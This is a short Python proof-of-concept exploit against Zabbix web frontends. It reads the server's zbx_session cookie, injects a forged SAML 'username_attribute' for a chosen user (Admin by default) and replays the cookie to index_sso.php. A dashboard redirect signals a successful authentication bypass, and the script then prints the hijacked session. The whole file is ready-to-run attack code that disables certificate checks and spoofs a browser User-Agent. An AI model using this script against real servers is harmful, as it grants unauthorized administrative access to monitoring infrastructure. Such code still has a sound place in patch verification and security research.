import requests
from urllib.parse import unquote, quote
from base64 import b64decode, b64encode
import json
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Zabbix server URL")
    parser.add_argument("-u", "--user", default="Admin", required=False, help="Zabbix user to authenticate as")
    parser.add_argument("-a", "--user-agent", required=False, help="Custom User-Agent")
    args = parser.parse_args()
    return args.target, args.user, args.user_agent


def generate_authenticated_zbx_session(zbx_session: str, username: str = "Admin") -> str:
    zbx_session_raw = b64decode(zbx_session)
    zbx = json.loads(zbx_session_raw)
    zbx["saml_data"] = {"username_attribute": username}
    return b64encode(json.dumps(zbx).encode()).decode("utf-8")


def exploit(target: str, username: str = "Admin", user_agent: str|None = None):
    headers = {
        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
        "Connection": "close",
        "Accept": "*/*"
    }
    data = requests.get(target, verify=False, headers=headers)
    zbx_session = unquote(data.cookies.get("zbx_session", ""))
    authenticated_session = generate_authenticated_zbx_session(zbx_session, username)
    payload = quote(authenticated_session)
    print("[+] Generated authenticated zbx_session")
    print(f"[+] Testing zbx_session: {target.rstrip('/')}/index_sso.php\n")
    auth = requests.get(f"{target.rstrip('/')}/index_sso.php", cookies={"zbx_session": payload}, headers=headers, verify=False, allow_redirects=False)
    redirect = auth.headers.get("Location")
    if "action=dashboard.view" in redirect:
        print(f"[+] Exploit was successful, here is your authenticated zbx_session:\n\t\033[33m{authenticated_session}\033[0m")
    else:
        print(f"\033[41m[!] Exploit was unsuccessful, redirected to {redirect}\033[0m")
  
if __name__ == "__main__":
    target, username, user_agent = get_arguments()
    exploit(target, username, user_agent)
